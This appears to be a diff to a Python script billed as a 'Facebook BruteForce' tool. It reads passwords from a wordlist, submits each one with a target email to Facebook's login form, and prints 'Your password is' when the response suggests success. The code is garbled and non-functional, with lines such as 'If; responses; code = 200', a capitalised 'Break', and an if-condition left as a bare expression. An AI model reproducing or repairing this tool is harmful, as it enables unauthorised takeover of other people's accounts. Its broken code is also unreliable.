@@ -27,16 +27,18 @@ except:
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('password.txt','r')
 
-email= input('Enter Email/Username :')
+email= input('Enter Email/Username : ')
 
 print ("\nTarget Email ID : ",email)
 print ("\nTrying Passwords from list ...")
 
 i=0
 while file:
-	file.readline()
+	passworder=file.readline().strip()
 	i+=1
-        print(file)
+	if len(passworder) < 10:
+		continue
+	print("Trying"+passworder)
 	responses = browser.open(post_url)
 Try
 If; responses; code = 200
@@ -45,7 +47,7 @@ browser.form['email'] = email
 browser.form['pass'] = file
 response = browser.submit()
 responses_data = responses.read()
-if 'Find Friends' in responses_data or 'Two-factor authentication' in responses_data or 'security code' in responses_data:
-	print('Your password is : ',file)
-	Break
+'Find Friends' in responses_data or 'Two-factor authentication' in responses_data or 'security code' in responses_data;
+print('Your password is : ',file)
+Break
 	
